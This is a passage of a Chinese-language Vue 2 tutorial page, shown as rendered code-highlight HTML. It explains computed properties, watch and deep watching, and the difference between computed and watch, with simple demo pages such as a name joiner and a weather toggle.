class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">测试：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;x&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="comment">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="comment">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">firstName</span>:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">lastName</span>:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">x</span>:<span class="string">&#x27;你好&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">demo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 完整写法、对象</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">fullName</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">get</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get被调用了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(this) //此处的this是vm</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//set什么时候调用? 当fullName被修改时。</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">set</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;set&#x27;</span>,value)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> arr = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">firstName</span> = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">lastName</span> = arr[<span class="number">1</span>]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 简写、函数</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">/*fullName()&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                  console.log(&#x27;get被调用了&#x27;)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                  return this.firstName + &#x27;-&#x27; + this.lastName</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                &#125;*/</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="监视属性-watch"><a href="#监视属性-watch" class="headerlink" title="监视属性-watch"></a>监视属性-watch</h2><h3 id="监视属性watch"><a href="#监视属性watch" class="headerlink" title="监视属性watch"></a>监视属性watch</h3><ul><li>1.当被<code>监视的属性变化</code>时, <code>回调函数自动调用</code>, 进行相关操作</li><li>2.监视的属性<code>(data中属性和computed中计算属性)</code>必须存在，才能进行监视！！，不存在也不报错</li><li>3.监视的两种写法：<ul><li>(1).new Vue时传入<code>watch配置</code></li><li>(2).通过<code>vm.$watch监视</code></li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例_监视属性<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 绑定事件的时候：@xxx=&quot;yyy&quot; yyy可以写一些简单的语句 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- &lt;button @click=&quot;isHot = !isHot&quot;&gt;切换天气&lt;/button&gt; --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">isHot</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">info</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">isHot</span> ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">changeWeather</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">isHot</span> = !<span class="variable language_">this</span>.<span class="property">isHot</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"> <span class="attr">watch</span>:&#123; <span class="comment">// watch里面放配置对象</span></span></span><br><span class="line"><span class="language-javascript">               <span class="comment">// 正常写法</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">isHot</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">immediate</span>:<span class="literal">true</span>, <span class="comment">//初始化时让handler调用一下</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//handler什么时候调用？当isHot发生改变时。</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">handler</span>(<span class="params">newValue,oldValue</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="comment">// 简写</span></span></span><br><span class="line"><span class="language-javascript">               <span class="comment">/* isHot(newValue,oldValue)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                   console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue,this)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">               &#125; */</span></span></span><br><span class="line"><span class="language-javascript">&#125; </span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 正常写法</span></span></span><br><span class="line"><span class="language-javascript">vm.$watch(<span class="string">&#x27;isHot&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">immediate</span>:<span class="literal">true</span>, <span class="comment">//初始化时让handler调用一下，即使isHot不改变</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//handler什么时候调用？当isHot发生改变时。</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">handler</span>(<span class="params">newValue,oldValue</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 简写</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* vm.$watch(&#x27;isHot&#x27;, function(newValue,oldValue)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue,this)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        &#125;) */</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="深度监视"><a href="#深度监视" class="headerlink" title="深度监视"></a>深度监视</h3><ul><li>深度监视：<ul><li>(1).Vue中的watch默认<code>不监测对象内部值</code>的<code>改变（一层）</code>。</li><li>(2).配置<code>deep:true</code>可以<code>监测对象内部值改变（多层）</code>。</li></ul></li><li>备注：<ul><li>(1).<code>Vue自身</code>可以<code>监测对象内部值</code>的<code>改变</code>，但Vue提供的<code>watch默认不可以</code>！</li><li>(2).使用watch时根据数据的具体结构，决定是否采用深度监视。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例_深度监视<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>a的值是:&#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>b的值是:&#123;&#123;numbers.b&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.b++&quot;</span>&gt;</span>点我让b+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers = &#123;a:666,b:888&#125;&quot;</span>&gt;</span>彻底替换掉numbers<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&#123;&#123;numbers.c.d.e&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">isHot</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">numbers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">a</span>:<span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">b</span>:<span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">c</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">d</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">e</span>:<span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">info</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">isHot</span> ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">changeWeather</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">isHot</span> = !<span class="variable language_">this</span>.<span class="property">isHot</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">isHot</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// immediate:true, //初始化时让handler调用一下</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//handler什么时候调用？当isHot发生改变时。</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">handler</span>(<span class="params">newValue,oldValue</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//监视多级结构中某个属性的变化</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* &#x27;numbers.a&#x27;:&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">handler()&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">console.log(&#x27;a被改变了&#x27;)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125; */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//监视多级结构中所有属性的变化</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">numbers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">deep</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">handler</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;numbers改变了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="computed和watch之间的区别"><a href="#computed和watch之间的区别" class="headerlink" title="computed和watch之间的区别"></a>computed和watch之间的区别</h2><ul><li>computed和watch之间的区别：<ul><li>1.computed能完成的功能，watch都可以完成。</li><li>2.watch能完成的功能，computed(靠的是返回值)不一定能完成，例如：watch可以进行<code>异步操作</code>。</li></ul></li><li>两个重要的小原则：<ul><li>1.所被<code>Vue管理的函数</code>，最好写成<code>普通函数</code>，这样<code>this的指向</code>才是<code>vm </code>或 <code>组件实例对象</code>。</li><li>2.所有<code>不被Vue所管理的函数</code>（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成<code>箭头函数</code>，这样<code>this的指向</code>才是<code>vm</code>或 <code>组件实例对象</code>。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>姓名案例_watch实现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">firstName</span>:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">lastName</span>:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">fullName</span>:<span class="string">&#x27;张-三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">firstName</span>(<span class="params">val</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 浏览器定时器管理模块控制，定时器到时间是js引擎调用的</span></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">fullName</span> = val + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">&#125;,<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">lastName</span>(<span class="params">val</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">fullName</span> = <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + val</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绑定样式"><a href="#绑定样式" class="headerlink" title="绑定样式"></a>绑定样式</h2><ul><li>class样式<ul><li>:class=”xxx” xxx可以是<code>字符串、对象、数组</code><ul><li>字符串写法适用于：类名不确定，要动态获取。</li><li>对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。</li><li>数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。</li></ul></li></ul></li><li>style样式<ul><li>:style=”xxx” xxx可以是<code>对象、数组</code><ul><li>:style=”{fontSize: xxx}”其中xxx是动态值。</li><li>:style=”[a,b]”其中a、b是样式对象。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>绑定样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.basic</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span 